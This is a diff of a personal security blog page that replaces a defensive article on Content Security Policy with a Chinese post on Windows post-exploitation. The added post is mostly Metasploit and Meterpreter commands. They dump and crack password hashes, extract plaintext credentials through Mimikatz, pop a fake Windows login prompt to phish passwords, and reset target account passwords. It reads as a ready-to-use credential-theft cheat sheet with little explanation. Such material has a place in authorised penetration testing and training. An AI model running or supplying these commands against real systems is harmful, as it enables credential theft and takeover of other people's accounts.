@@ -77,7 +77,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="security,xss,frontend," />
+  <meta name="keywords" content="security,metasploit," />
 
 
 
@@ -95,19 +95,25 @@
 
 
 
-<meta name="description" content="简介内容安全策略(Content Security Policy)可以控制浏览器信任以何种方式、何种来源去加载资源，用于削弱 XSS 的危害，也可以防止使用 HTTP 时被注入恶意代码，通过服务器返回 Content-Security-Policy 来告诉浏览器具体的策略，因此需要浏览器支持。另外 meta 元素也可以设置:
-1234&amp;lt;meta    http-equiv=&quot;Content-">
+<meta name="description" content="获取 hashmeterpreter1$ meterpreter &amp;gt; hashdump
+将 hash 值保存到文件中，然后用 john 破解：
+1john --wordlist=/root/Desktop/pass.txt --format=NT /root/Desktop/hashes.txt
+hashdump123$ msf &amp;gt; use post/windows/gather/ha">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内容安全策略">
-<meta property="og:url" content="http://myt0.com/2018/08/09/CSP/index.html">
+<meta property="og:title" content="windows后渗透利用">
+<meta property="og:url" content="http://myt0.com/2019/03/03/windows后渗透利用/index.html">
 <meta property="og:site_name" content="Myths">
-<meta property="og:description" content="简介内容安全策略(Content Security Policy)可以控制浏览器信任以何种方式、何种来源去加载资源，用于削弱 XSS 的危害，也可以防止使用 HTTP 时被注入恶意代码，通过服务器返回 Content-Security-Policy 来告诉浏览器具体的策略，因此需要浏览器支持。另外 meta 元素也可以设置:
-1234&amp;lt;meta    http-equiv=&quot;Content-">
-<meta property="og:updated_time" content="2019-03-01T08:35:25.175Z">
+<meta property="og:description" content="获取 hashmeterpreter1$ meterpreter &amp;gt; hashdump
+将 hash 值保存到文件中，然后用 john 破解：
+1john --wordlist=/root/Desktop/pass.txt --format=NT /root/Desktop/hashes.txt
+hashdump123$ msf &amp;gt; use post/windows/gather/ha">
+<meta property="og:updated_time" content="2019-03-03T09:59:11.434Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="内容安全策略">
-<meta name="twitter:description" content="简介内容安全策略(Content Security Policy)可以控制浏览器信任以何种方式、何种来源去加载资源，用于削弱 XSS 的危害，也可以防止使用 HTTP 时被注入恶意代码，通过服务器返回 Content-Security-Policy 来告诉浏览器具体的策略，因此需要浏览器支持。另外 meta 元素也可以设置:
-1234&amp;lt;meta    http-equiv=&quot;Content-">
+<meta name="twitter:title" content="windows后渗透利用">
+<meta name="twitter:description" content="获取 hashmeterpreter1$ meterpreter &amp;gt; hashdump
+将 hash 值保存到文件中，然后用 john 破解：
+1john --wordlist=/root/Desktop/pass.txt --format=NT /root/Desktop/hashes.txt
+hashdump123$ msf &amp;gt; use post/windows/gather/ha">
 
 
 
@@ -131,13 +137,13 @@
 
 
 
-  <link rel="canonical" href="http://myt0.com/2018/08/09/CSP/"/>
+  <link rel="canonical" href="http://myt0.com/2019/03/03/windows后渗透利用/"/>
 
 
 
 
 
-  <title>内容安全策略 | Myths</title>
+  <title>windows后渗透利用 | Myths</title>
   
 
 
@@ -266,7 +272,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://myt0.com/2018/08/09/CSP/">
+    <link itemprop="mainEntityOfPage" href="http://myt0.com/2019/03/03/windows后渗透利用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Myths">
@@ -283,7 +289,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">内容安全策略</h1>
+          <h1 class="post-title" itemprop="name headline">windows后渗透利用</h1>
         
 
         <div class="post-meta">
@@ -295,8 +301,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-09T07:47:00+08:00">
-                2018-08-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-03T04:31:18+08:00">
+                2019-03-03
               </time>
             
 
@@ -330,18 +336,22 @@
       
 
       
-        <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>内容安全策略(Content Security Policy)可以控制浏览器信任以何种方式、何种来源去加载资源，用于削弱 XSS 的危害，也可以防止使用 HTTP 时被注入恶意代码，通过服务器返回 Content-Security-Policy 来告诉浏览器具体的策略，因此需要浏览器支持。<br>另外 meta 元素也可以设置:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span></span><br><span class="line">    <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span></span><br><span class="line">    <span class="attr">content</span>=<span class="string">"default-src 'self'; img-src https://*; child-src 'none';"</span></span><br><span class="line">/&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里可以看到，CSP 是通过规定可信域，来限制脚本或者其他静态资源的执行。</p>
-<h3 id="常见字段"><a href="#常见字段" class="headerlink" title="常见字段"></a>常见字段</h3><p>字段之间通过分号相隔，字段值可以使用通配符，多个值以空格相隔。<br>self 代表本站</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 允许所有内容来源于本站及myt0.com子域名</span></span><br><span class="line">default-src <span class="string">'self'</span> *.myt0.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有内容来源于myt0.com，并且要通过https协议，防止监听</span></span><br><span class="line">default-src https://myt0.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片来源于所有</span></span><br><span class="line">img-src *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 样式来源设置</span></span><br><span class="line">style-src myt0.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制音频地址</span></span><br><span class="line">media-src myt0.com youtube.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制JS脚本地址，禁止行内脚本，禁止eval函数</span></span><br><span class="line">script-src myt0.com <span class="string">'unsafe-inline'</span> <span class="string">'unsafe-eval'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制&lt;object&gt;, &lt;embed&gt;, &lt;applet&gt;标签的来源</span></span><br><span class="line">object-src https://myt0.com</span><br></pre></td></tr></table></figure>
-<p>其他字段的解释及浏览器兼容具体参见<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="external">MDN 内容安全策略( CSP )</a></p>
-<h3 id="报告模式"><a href="#报告模式" class="headerlink" title="报告模式"></a>报告模式</h3><p>Content-Security-Policy-Report-Only 会启用报告模式，不强制采用指定的策略，但是违规的行为会报告给一个指定的 URI，也可以用这个头来进行测试。<br>Content-Security-Policy-Report-Only 和 Content-Security-Policy 同时存在时，两者均有效，前者仅报告，后者强制执行策略。<br>Content-Security-Policy 增加 report-uri 启用违规报告：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">'self'</span>; report-uri http:<span class="comment">//reportcollector.example.com/collector.cgi</span></span><br></pre></td></tr></table></figure>
-<p>当违规行为发生时，会将违规结果以 POST 方式发送到指定 URI，格式为 JSON，语法如下：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    "csp-report": &#123;</span><br><span class="line">        //发生违规的文档的URI</span><br><span class="line">        "document-uri": "http://example.com/signup.html",</span><br><span class="line">        //违规发生处的文档引用（地址）</span><br><span class="line">        "referrer": "",</span><br><span class="line">        //被CSP阻止的资源URI。如果被阻止的URI来自不同的源而非文档URI，那么被阻止的资源URI会被删减，仅保留协议，主机和端口号。</span><br><span class="line">        "blocked-uri": "http://example.com/css/style.css",</span><br><span class="line">        //违反的策略名称。</span><br><span class="line">        "violated-directive": "style-src cdn.example.com",</span><br><span class="line">        //在 Content-Security-Policy HTTP 头部中指明的原始策略</span><br><span class="line">        "original-policy": "default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="nginx-配置"><a href="#nginx-配置" class="headerlink" title="nginx 配置"></a>nginx 配置</h3><p>在 conf 中加入：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_header Content-Security-Policy <span class="string">"script-src 'self' 'unsafe-inline' 'unsafe-eval' *.youtube.com maps.gstatic.com *.googleapis.com *.google-analytics.com cdnjs.cloudflare.com assets.zendesk.com connect.facebook.net; frame-src 'self' *.youtube.com assets.zendesk.com *.facebook.com s-static.ak.facebook.com tautt.zendesk.com; object-src 'self'"</span>;</span><br></pre></td></tr></table></figure>
+        <h2 id="获取-hash"><a href="#获取-hash" class="headerlink" title="获取 hash"></a>获取 hash</h2><h3 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ meterpreter &gt; hashdump</span><br></pre></td></tr></table></figure>
+<p>将 hash 值保存到文件中，然后用 john 破解：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/root/Desktop/pass.txt --format=NT /root/Desktop/hashes.txt</span><br></pre></td></tr></table></figure>
+<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ msf &gt; use post/windows/gather/hashdump</span><br><span class="line">$ msf post(hashdump) &gt; set session 2</span><br><span class="line">$ msf post(hashdump) &gt; exploit</span><br></pre></td></tr></table></figure>
+<h3 id="smart-hashdump"><a href="#smart-hashdump" class="headerlink" title="smart_hashdump"></a>smart_hashdump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ msf &gt; use post/windows/gather/smart_hashdump</span><br><span class="line">$ msf post(hashdump) &gt; set session 2</span><br><span class="line">$ msf post(hashdump) &gt; exploit</span><br></pre></td></tr></table></figure>
+<h3 id="credential-collector"><a href="#credential-collector" class="headerlink" title="credential_collector"></a>credential_collector</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ msf &gt; use post/windows/gather/credentials/credential_collector</span><br><span class="line">$ msf post(credential_collector) &gt; set session 2</span><br><span class="line">$ msf post(credential_collector) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p>上面 4 种得到的都是 hash，需要破解，下面看看怎么直接得到明文密码。</p>
+<h2 id="获取明文密码"><a href="#获取明文密码" class="headerlink" title="获取明文密码"></a>获取明文密码</h2><h3 id="sso-模块"><a href="#sso-模块" class="headerlink" title="sso 模块"></a>sso 模块</h3><p>实际上这一功能利用的是 Mimikatz 扩展。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use post/windows/gather/credentials/sso</span><br><span class="line">msf post(sso) &gt; set session 2</span><br><span class="line">msf post(sso) &gt; exploit</span><br></pre></td></tr></table></figure>
+<h3 id="meterpreter-kiwi"><a href="#meterpreter-kiwi" class="headerlink" title="meterpreter kiwi"></a>meterpreter kiwi</h3><p>这也是用的 Mimikatz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; creds_all</span><br></pre></td></tr></table></figure>
+<h3 id="伪造登录框"><a href="#伪造登录框" class="headerlink" title="伪造登录框"></a>伪造登录框</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use post/windows/gather/phish_windows_credentials</span><br><span class="line">msf post(phish_windows_credentials) &gt; set session 2</span><br><span class="line">msf post(phish_windows_credentials) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p>这时候会伪造假冒的登录框，对方输入密码之后我们就可以得到了。</p>
+<h2 id="更改目标密码"><a href="#更改目标密码" class="headerlink" title="更改目标密码"></a>更改目标密码</h2><h3 id="change-password"><a href="#change-password" class="headerlink" title="change_password"></a>change_password</h3><p>这种主要适用于你创建了一个新账号，但是对方账号策略强制在登录之前必须修改密码，否则你登录会报错：’System error 1907 has occurred’。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use post/windows/manage/change_password</span><br><span class="line">msf post(change_password) &gt; set smbuser raj</span><br><span class="line">msf post(change_password) &gt; set old_password 123</span><br><span class="line">msf post(change_password) &gt; set new_password 987</span><br><span class="line">msf post(change_password) &gt; set session 1</span><br><span class="line">msf post(change_password) &gt; exploit</span><br></pre></td></tr></table></figure>
+<h3 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterepreter&gt; shell</span><br><span class="line">net user</span><br><span class="line">net user raj 123</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -370,7 +380,7 @@
     </li>
     <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://myt0.com/2018/08/09/CSP/" title="内容安全策略">http://myt0.com/2018/08/09/CSP/</a>
+      <a href="http://myt0.com/2019/03/03/windows后渗透利用/" title="windows后渗透利用">http://myt0.com/2019/03/03/windows后渗透利用/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明： </strong>
@@ -388,9 +398,7 @@
           
             <a href="/tags/security/" rel="tag"># security</a>
           
-            <a href="/tags/xss/" rel="tag"># xss</a>
-          
-            <a href="/tags/frontend/" rel="tag"># frontend</a>
+            <a href="/tags/metasploit/" rel="tag"># metasploit</a>
           
         </div>
       
@@ -403,8 +411,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/01/summary-of-webpack/" rel="next" title="webpack4 笔记">
-                <i class="fa fa-chevron-left"></i> webpack4 笔记
+              <a href="/2019/03/01/中间人工具bettercap/" rel="next" title="中间人工具bettercap">
+                <i class="fa fa-chevron-left"></i> 中间人工具bettercap
               </a>
             
           </div>
@@ -413,8 +421,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/03/01/中间人工具bettercap/" rel="prev" title="中间人工具bettercap">
-                中间人工具bettercap <i class="fa fa-chevron-right"></i>
+              <a href="/2019/03/03/php命令执行WAF-Filter绕过/" rel="prev" title="PHP命令执行时的WAF&Filter绕过方法">
+                PHP命令执行时的WAF&Filter绕过方法 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -541,7 +549,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见字段"><span class="nav-number">2.</span> <span class="nav-text">常见字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报告模式"><span class="nav-number">3.</span> <span class="nav-text">报告模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nginx-配置"><span class="nav-number">4.</span> <span class="nav-text">nginx 配置</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#获取-hash"><span class="nav-number">1.</span> <span class="nav-text">获取 hash</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#meterpreter"><span class="nav-number">1.1.</span> <span class="nav-text">meterpreter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashdump"><span class="nav-number">1.2.</span> <span class="nav-text">hashdump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smart-hashdump"><span class="nav-number">1.3.</span> <span class="nav-text">smart_hashdump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#credential-collector"><span class="nav-number">1.4.</span> <span class="nav-text">credential_collector</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取明文密码"><span class="nav-number">2.</span> <span class="nav-text">获取明文密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sso-模块"><span class="nav-number">2.1.</span> <span class="nav-text">sso 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#meterpreter-kiwi"><span class="nav-number">2.2.</span> <span class="nav-text">meterpreter kiwi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#伪造登录框"><span class="nav-number">2.3.</span> <span class="nav-text">伪造登录框</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#更改目标密码"><span class="nav-number">3.</span> <span class="nav-text">更改目标密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#change-password"><span class="nav-number">3.1.</span> <span class="nav-text">change_password</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#net-user"><span class="nav-number">3.2.</span> <span class="nav-text">net user</span></a></li></ol></li></ol></div>
             
 
           </div>
